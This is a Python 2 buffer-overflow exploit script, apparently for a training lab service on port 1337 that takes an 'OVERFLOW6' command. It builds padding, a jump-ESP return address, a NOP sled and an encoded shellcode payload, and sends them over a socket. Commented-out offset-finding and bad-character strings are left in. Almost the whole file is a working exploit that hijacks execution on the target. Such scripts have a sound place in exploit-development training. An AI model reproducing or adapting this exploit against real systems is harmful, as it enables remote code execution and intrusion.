#!/usr/bin/python2

import socket,sys

address = sys.argv[1]
port = 1337

#value= input("Enter the crash byte : ")

#offset="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9"
#breakpoint is 500
offsetvalue =1034
#testing for bof5
buffer= 'A'* offsetvalue
#eip= 'B'*4
jumpesp="\xBB\x11\x50\x62"

#eip='\xBB\x11\x50\x62'
nops='\x90'*20
shellcode=("\xbb\x2e\x7c\xd8\x37\xda\xd6\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x52\x31\x5a\x12\x03\x5a\x12\x83\xec\x78\x3a\xc2\x0c\x68\x38"
"\x2d\xec\x69\x5d\xa7\x09\x58\x5d\xd3\x5a\xcb\x6d\x97\x0e\xe0"
"\x06\xf5\xba\x73\x6a\xd2\xcd\x34\xc1\x04\xe0\xc5\x7a\x74\x63"
"\x46\x81\xa9\x43\x77\x4a\xbc\x82\xb0\xb7\x4d\xd6\x69\xb3\xe0"
"\xc6\x1e\x89\x38\x6d\x6c\x1f\x39\x92\x25\x1e\x68\x05\x3d\x79"
"\xaa\xa4\x92\xf1\xe3\xbe\xf7\x3c\xbd\x35\xc3\xcb\x3c\x9f\x1d"
"\x33\x92\xde\x91\xc6\xea\x27\x15\x39\x99\x51\x65\xc4\x9a\xa6"
"\x17\x12\x2e\x3c\xbf\xd1\x88\x98\x41\x35\x4e\x6b\x4d\xf2\x04"
"\x33\x52\x05\xc8\x48\x6e\x8e\xef\x9e\xe6\xd4\xcb\x3a\xa2\x8f"
"\x72\x1b\x0e\x61\x8a\x7b\xf1\xde\x2e\xf0\x1c\x0a\x43\x5b\x49"
"\xff\x6e\x63\x89\x97\xf9\x10\xbb\x38\x52\xbe\xf7\xb1\x7c\x39"
"\xf7\xeb\x39\xd5\x06\x14\x3a\xfc\xcc\x40\x6a\x96\xe5\xe8\xe1"
"\x66\x09\x3d\xa5\x36\xa5\xee\x06\xe6\x05\x5f\xef\xec\x89\x80"
"\x0f\x0f\x40\xa9\xba\xea\x03\xdc\x32\xf1\xdd\x88\x40\xf9\xe5"
"\x9a\xcc\x1f\x8f\x0a\x99\x88\x38\xb2\x80\x42\xd8\x3b\x1f\x2f"
"\xda\xb0\xac\xd0\x95\x30\xd8\xc2\x42\xb1\x97\xb8\xc5\xce\x0d"
"\xd4\x8a\x5d\xca\x24\xc4\x7d\x45\x73\x81\xb0\x9c\x11\x3f\xea"
"\x36\x07\xc2\x6a\x70\x83\x19\x4f\x7f\x0a\xef\xeb\x5b\x1c\x29"
"\xf3\xe7\x48\xe5\xa2\xb1\x26\x43\x1d\x70\x90\x1d\xf2\xda\x74"
"\xdb\x38\xdd\x02\xe4\x14\xab\xea\x55\xc1\xea\x15\x59\x85\xfa"
"\x6e\x87\x35\x04\xa5\x03\x45\x4f\xe7\x22\xce\x16\x72\x77\x93"
"\xa8\xa9\xb4\xaa\x2a\x5b\x45\x49\x32\x2e\x40\x15\xf4\xc3\x38"
"\x06\x91\xe3\xef\x27\xb0")
"""badchar=("\x01\x02\x03\x04\x05\x06\x07\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21"
"\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42"
"\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62"
"\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82"
"\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2"
"\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xae\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4"
"\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4"
"\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
"""#shellcode= 'C'*400

#jump esp location



try:
	print '[+] Sending buffer'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)			
	s.send('OVERFLOW6 ' + buffer + jumpesp + nops + shellcode +'\r\n')
except:
 	print '[!] Unable to connect to the application.\n'
 	print 'Input Variable has been filled with the buffer '
 	sys.exit(0)
finally:
	s.close() 
